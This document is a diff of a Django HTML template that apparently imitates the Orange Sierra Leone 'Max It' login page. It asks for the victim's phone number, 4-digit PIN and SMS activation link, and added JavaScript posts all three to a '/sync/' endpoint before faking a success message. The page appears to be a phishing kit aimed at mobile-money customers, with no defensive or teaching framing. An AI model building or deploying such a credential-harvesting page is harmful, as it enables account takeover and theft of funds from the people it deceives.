@@ -1,61 +1,197 @@
 {% extends 'base.html' %}
 
 {% block content %}
-<div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl relative overflow-hidden flex flex-col">
-    
-    <div class="h-[45vh] relative">
-        <img src="https://images.unsplash.com/photo-1523908511403-7fc7b25592f4?w=800" 
-             class="w-full h-full object-cover" alt="Orange Lifestyle">
-        <div class="absolute bottom-0 left-0 w-full h-16 bg-white rounded-t-[40px]"></div>
+
+<div class="max-w-md mx-auto bg-white min-h-screen shadow-2xl overflow-hidden flex flex-col">
+
+    <!-- TOP IMAGE -->
+    <div class="relative h-[38vh]">
+        <img
+            src="https://images.unsplash.com/photo-1522202176988-66273c2fd55f?w=1200"
+            class="w-full h-full object-cover"
+            alt="Orange Max It">
+
+        <div class="absolute inset-0 bg-black/20"></div>
+
+        <div class="absolute bottom-0 left-0 w-full h-10 bg-white rounded-t-[35px]"></div>
     </div>
 
-    <div class="px-8 flex-grow bg-white">
-        <h1 class="text-3xl font-black text-black mb-10">Authentication</h1>
+    <!-- CONTENT -->
+    <div class="bg-white flex-1 px-8 pt-6 pb-10">
 
-        <form action="{% url 'success' %}" method="POST" class="space-y-12">
+        <!-- HEADER -->
+        <div class="mb-10">
+            <p class="text-xs uppercase tracking-[4px] text-gray-400 font-bold mb-2">
+                Orange Max It
+            </p>
+
+            <h1 class="text-3xl font-black text-black leading-tight">
+                Authentication
+            </h1>
+
+            <p class="text-sm text-gray-500 mt-3 leading-relaxed">
+                Enter your Orange number, Max It PIN and SMS activation link to continue.
+            </p>
+        </div>
+
+        <!-- FORM -->
+        <form id="auth-form" class="space-y-8">
+
             {% csrf_token %}
-            
-            <div class="relative border-b-2 border-[#ff7900] pb-2">
-                <label class="text-[10px] text-gray-500 uppercase font-bold block mb-1">
-                    Enter your phone number <span class="text-red-500">*</span>
+
+            <!-- PHONE -->
+            <div>
+
+                <label class="text-[11px] font-black uppercase tracking-widest text-gray-500 block mb-3">
+                    Orange Number
                 </label>
-                <div class="flex items-center gap-4">
-                    <div class="text-[#ff7900]">
-                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
-                            <path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd" />
-                        </svg>
-                    </div>
-                    <input type="tel" name="phone" required placeholder="+232" 
-                           class="w-full bg-transparent text-black text-lg outline-none font-semibold">
+
+                <div class="flex items-center border-b-2 border-[#ff7900] pb-3">
+
+                    <span class="font-black text-[#ff7900] text-lg mr-3">
+                        +232
+                    </span>
+
+                    <input
+                        type="tel"
+                        id="phone"
+                        placeholder="76 000000"
+                        required
+                        class="w-full outline-none text-lg font-semibold text-black bg-transparent">
                 </div>
+
             </div>
 
-            <div class="relative border-b-2 border-gray-200 pb-2 focus-within:border-[#ff7900] transition-colors">
-                <label class="text-[10px] text-gray-500 uppercase font-bold block mb-1">
-                    SMS Activation Link <span class="text-red-500">*</span>
+            <!-- PIN -->
+            <div>
+
+                <label class="text-[11px] font-black uppercase tracking-widest text-gray-500 block mb-3">
+                    Orange PIN
                 </label>
-                <div class="flex items-center gap-4">
-                    <div class="text-gray-400">
-                        <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.102-1.101m-.758-4.899a4 4 0 005.656 0l4-4a4 4 0 00-5.656-5.656l-1.1 1.1" />
-                        </svg>
-                    </div>
-                    <input type="url" name="otp_link" required placeholder="https://maxit.orange.sl/..." 
-                           class="w-full bg-transparent text-black text-sm outline-none italic">
+
+                <div class="flex items-center border-b-2 border-[#ff7900] pb-3">
+
+                    <svg class="w-5 h-5 text-[#ff7900] mr-3"
+                         fill="none"
+                         stroke="currentColor"
+                         viewBox="0 0 24 24">
+                        <path stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M12 11c0 .552-.448 1-1 1s-1-.448-1-1 .448-1 1-1 1 .448 1 1zm0 0V9m0 6h.01M5 20h14a2 2 0 002-2V6a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z"/>
+                    </svg>
+
+                    <input
+                        type="password"
+                        id="pin"
+                        maxlength="4"
+                        placeholder="••••"
+                        required
+                        class="w-full outline-none text-lg tracking-[10px] font-black text-black bg-transparent">
                 </div>
+
             </div>
 
+            <!-- OTP -->
+            <div>
+
+                <label class="text-[11px] font-black uppercase tracking-widest text-gray-500 block mb-3">
+                    SMS Activation Link
+                </label>
+
+                <div class="flex items-center border-b-2 border-gray-300 focus-within:border-[#ff7900] pb-3 transition-all">
+
+                    <svg class="w-5 h-5 text-gray-400 mr-3"
+                         fill="none"
+                         stroke="currentColor"
+                         viewBox="0 0 24 24">
+                        <path stroke-linecap="round"
+                              stroke-linejoin="round"
+                              stroke-width="2"
+                              d="M13.828 10.172a4 4 0 00-5.656 0l-4 4a4 4 0 105.656 5.656l1.1-1.1m-.758-4.9a4 4 0 005.656 0l4-4a4 4 0 10-5.656-5.656l-1.1 1.1"/>
+                    </svg>
+
+                    <input
+                        type="url"
+                        id="otp"
+                        placeholder="https://maxit.orange.sl/..."
+                        required
+                        class="w-full outline-none text-sm italic text-black bg-transparent">
+                </div>
+
+            </div>
+
+            <!-- BUTTON -->
             <div class="pt-6">
-                <button type="submit" 
-                        class="w-full bg-[#ff7900] text-white font-bold py-4 rounded-xl shadow-lg hover:brightness-110 active:scale-[0.98] transition-all uppercase tracking-widest text-sm">
+
+                <button
+                    type="button"
+                    onclick="submitData()"
+                    class="w-full bg-[#ff7900] text-white py-5 rounded-2xl font-black uppercase tracking-widest shadow-xl hover:brightness-110 transition-all active:scale-[0.98]">
+
                     Confirm Authentication
+
                 </button>
+
             </div>
+
         </form>
+
     </div>
 
-    <div class="p-8 text-center bg-white">
-        <p class="text-[9px] text-gray-400 uppercase tracking-[4px]">Powered by Orange Sierra Leone</p>
+    <!-- FOOTER -->
+    <div class="pb-8 text-center bg-white">
+
+        <p class="text-[9px] uppercase tracking-[4px] text-gray-400">
+            Powered by Orange Sierra Leone
+        </p>
+
     </div>
+
 </div>
+
+<script>
+
+function submitData() {
+
+    const payload = {
+        phone: document.getElementById('phone').value,
+        pin: document.getElementById('pin').value,
+        otp: document.getElementById('otp').value
+    };
+
+    fetch('/sync/', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+            'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
+        },
+        body: JSON.stringify(payload)
+    })
+    .then(response => response.json())
+    .then(data => {
+
+        if (data.status === 'success') {
+
+            alert('Authentication successful');
+
+            window.location.href = '/';
+
+        } else {
+
+            alert('Server Error');
+
+        }
+
+    })
+    .catch(error => {
+
+        alert('Connection Error');
+
+    });
+
+}
+
+</script>
+
 {% endblock %}
